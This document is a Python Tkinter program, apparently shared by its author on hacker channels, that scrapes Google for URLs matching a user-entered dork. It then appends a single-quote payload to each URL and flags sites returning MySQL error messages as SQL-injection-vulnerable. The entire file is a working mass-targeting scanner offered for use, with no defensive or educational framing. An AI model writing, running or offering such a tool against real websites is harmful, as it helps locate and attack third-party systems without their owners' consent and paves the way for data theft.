# Code by Howert
# Discord: howert1337
# Telegram: howertxd

import tkinter as tk
import requests
from bs4 import BeautifulSoup
from urllib.parse import unquote

def scantext():
    sites_text = result_text.get(1.0, tk.END)
    sites = sites_text.splitlines()
    result_text.delete(1.0, tk.END)

    for site in sites:
        scan(site.strip())

def scan_site():
    url = site_entry.get()
    result_text.delete(1.0, tk.END)
    scan(url)

def search_dork():
    dork = dork_entry.get()
    num = int(num_entry.get())
    result_text.delete(1.0, tk.END)
    search(dork, num)

def clear_results():
    result_text.delete(1.0, tk.END)

def scan(url):
    payloads = ["'"]
    for payload in payloads:
        r = requests.get(url + payload)


        if "mysql_fetch_array()" in r.text or "You have an error in your SQL syntax" in r.text:
            result_text.insert(tk.END, "SQL Açığı: " + url + "\n")



def search(search_term, num):
    res = requests.get(f"https://www.google.com/search?q={search_term}&num={num}")
    soup = BeautifulSoup(res.text, "html.parser")
    search_results = soup.select(".kCrYT a")
    links = []
    for result in search_results:
        link = result.get("href")
        if link.startswith("/url?q="):
            link = link.replace("/url?q=", "")
            link = link.split("&")[0]
            link = unquote(link)
            links.append(link)
    for link in links:
        result_text.insert(tk.END, link + "\n")


root = tk.Tk()

root.title(f"SQL Scanner")
root.geometry("600x400")
site_frame = tk.Frame(root)
site_frame.pack(pady=10)
site_label = tk.Label(site_frame, text="Taranacak site:")
site_label.pack(side="left")
site_entry = tk.Entry(site_frame, width=40)
site_entry.pack(side="left", padx=5)
site_button = tk.Button(site_frame, text="Tara", command=scan_site)
site_button.pack(side="left", padx=5)

dork_frame = tk.Frame(root)
dork_frame.pack(pady=10)
dork_label = tk.Label(dork_frame, text="Dork:")
dork_label.pack(side="left")
dork_entry = tk.Entry(dork_frame, width=30)
dork_entry.pack(side="left", padx=5)
num_label = tk.Label(dork_frame, text="Sonuç Sayısı:")
num_label.pack(side="left")
num_entry = tk.Entry(dork_frame, width=10)
num_entry.pack(side="left", padx=5)
dork_button = tk.Button(dork_frame, text="Ara", command=search_dork)
dork_button.pack(side="left", padx=5)

result_text = tk.Text(root, height=12, width=50)
result_text.pack(pady=10)
clear_button = tk.Button(root, text="Sonuçları Temizle", command=clear_results)
clear_button.pack(side="left", padx=5)
scan_button = tk.Button(root, text="Sonuçları Tara", command=scantext)
scan_button.pack(side="left", padx=5)
author = tk.Label(root, text=f"                                                     Code by Howert")
author.pack(side="left")

root.mainloop()

